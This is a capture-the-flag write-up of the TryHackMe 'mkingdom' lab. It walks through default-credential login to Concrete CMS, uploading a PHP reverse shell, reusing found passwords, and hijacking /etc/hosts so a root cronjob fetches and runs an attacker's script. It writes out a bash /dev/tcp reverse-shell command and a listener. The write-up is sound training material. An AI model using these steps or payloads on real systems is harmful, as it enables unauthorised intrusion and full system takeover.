---
title: "TryHackMe - mkingdom"
author: Nasrallah
description: ""
date: 2024-10-05 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, cronjob, upload]
img_path: /assets/img/tryhackme/mkingdom
image:
    path: mkingdom.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

## **Description:**

[Mkingdom](https://tryhackme.com/room/mkingdom) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) is running a web server with a cms that allows file upload, we exploit that to get foothold. On the machine we find credentials on the config file giving us access to a user. After that we discover a cronjob requesting a file on the website and it's using hostname for that, we find that we can write to `/etc/hosts` file so we edit it to point to our machine and get root shell.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.92.20
Host is up (0.10s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN
```

We found port 85 running an apache web server.

### Web

Let's navigate to the website

![website](1.png)

The website looks like it got hacked, Let's run a directory scan.

```terminal
 ___  ___  __   __     __      __         __   ___                                                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.10.4                                                                                                                                            
───────────────────────────┬──────────────────────                                                                                                                                            
 🎯  Target Url            │ http://10.10.92.20:85                                                                                                                                            
 🚀  Threads               │ 50                                                                                                                                                               
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt                                                                                                      
 👌  Status Codes          │ All Status Codes!                                                                                                                                                
 💥  Timeout (secs)        │ 7                                                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.10.4                                                                                                                                               
 🔎  Extract Links         │ true                                                                                                                                                             
 🏁  HTTP methods          │ [GET]                                                                                                                                                            
 🚫  Do Not Recurse        │ true                                                                                                                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                                                            
───────────────────────────┴──────────────────────                                                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                                                           
──────────────────────────────────────────────────                                                                                                                                                                                         
200      GET       98l      326w    50278c http://10.10.92.20:85/img1.jpg
200      GET       33l       69w      647c http://10.10.92.20:85/
301      GET        9l       28w      310c http://10.10.92.20:85/app => http://10.10.92.20:85/app/
```

We found `/app`, let's check it.

![app](2.png)

It contained a button and redirects us to `/app/castle`.

Scrolling down we find that it's running `concrete cms`, and looking at wappalyzer, we see it's version `8.5.2`

![cmd](3.png)

![wapp](4.png)

At the bottom right we can find a link to a login page.

![login](5.png)

Tried some default credentials and managed to login with `admin:password`.

![dashboard](6.png)

Searching on google for exploits on `concrete 8.5.2` we find the following hackerone report <https://vulners.com/hackerone/H1:768322>

It showcases the upload of a php reverse shell and getting a foothold on the machine.

## **Foothold**

First we got to `system & settings` and select `Allowed File Types`.

![settings](7.png)

Then we add php to the list and click save.

![php](8.php)

Now we go to `Files` and select `Upload Files`

![upload](9.png)

We upload a php reverse shell, you can find one [here](https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php).

After we select our file, we click close, we setup a listener.

Then we click on the link to the file.

![link](10.png)

We check our listener and see the shell.

![shell](11.png)

## **Privilege Escalation**

### www-data -> toad

Let's run linpeas

![pass](12.png)

We found toad's passwords, let's switch users

```terminal
www-data@mkingdom:/$ su toad              
Password: 
toad@mkingdom:/$ id
uid=1002(toad) gid=1002(toad) groups=1002(toad)
```

### taod -> mario

Checking our environment variables with `env` we find `PWD_token`.

```terminal
toad@mkingdom:~$ env     
APACHE_PID_FILE=/var/run/apache2/apache2.pid
XDG_SESSION_ID=c2                 
SHELL=/bin/bash                        
[...]
PWD_token=aWthVGVOVEFOdEVTCg==
[...]
```

Let's decode it.

```terminal
toad@mkingdom:~$ echo aWthVGVOVEFOdEVTCg== | base64 -d
ikaTeNTANtES
```

Let's use this strings to change to user mario.

```terminal
toad@mkingdom:~$ su mario
Password: 
mario@mkingdom:/home/toad$ sudo -l
[sudo] password for mario:             
Matching Defaults entries for mario on mkingdom:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    pwfeedback

User mario may run the following commands on mkingdom:
    (ALL) /usr/bin/id
mario@mkingdom:
```

We succeeded in that.

### mario -> root

We upload `pspy64` and run it.

![pspy](13.png)

We see here that a request to `mkingdom.thm:85/app/castle/application/counter.sh` file and it get piped to bash.

Unfortunately, we don't have write permission on that file.

But we see here that it's using a hostname `mkingdom.thm`. If we check the /etc/hosts file we see that we have write permissions on.

```terminal
mario@mkingdom:~$ ls -l /etc/hosts
-rw-rw-r-- 1 root mario 343 Sep 28 13:17 /etc/hosts
```

Let's edit the file and make the mkingdom.thm hostname point to our machine.

```terminal
mario@mkingdom:~$ cat /etc/hosts
127.0.0.1       localhost
10.9.4.213 mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org
```

Now on our machine, we create the necessary folders:

```bash
mkdir -p app/castle/application
```

then we create the counter.sh that sends us a rev shell.

```bash
echo 'bash -i >& /dev/tcp/10.9.4.213/9002 0>&1' > app/castle/application/counter.sh
```

And now we setup a web server on port 85 using python

```bash
sudo python3 -m http.server 85
```

Now we if check our listener we can see the root shell.

```terminal
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/kingdom]
└──╼ [★]$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.9.4.213] from (UNKNOWN) [10.10.121.152] 47602
bash: cannot set terminal process group (3497): Inappropriate ioctl for device
bash: no job control in this shell
root@mkingdom:~# id
id
uid=0(root) gid=0(root) groups=0(root)
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://vulners.com/hackerone/H1:768322>

<https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php>
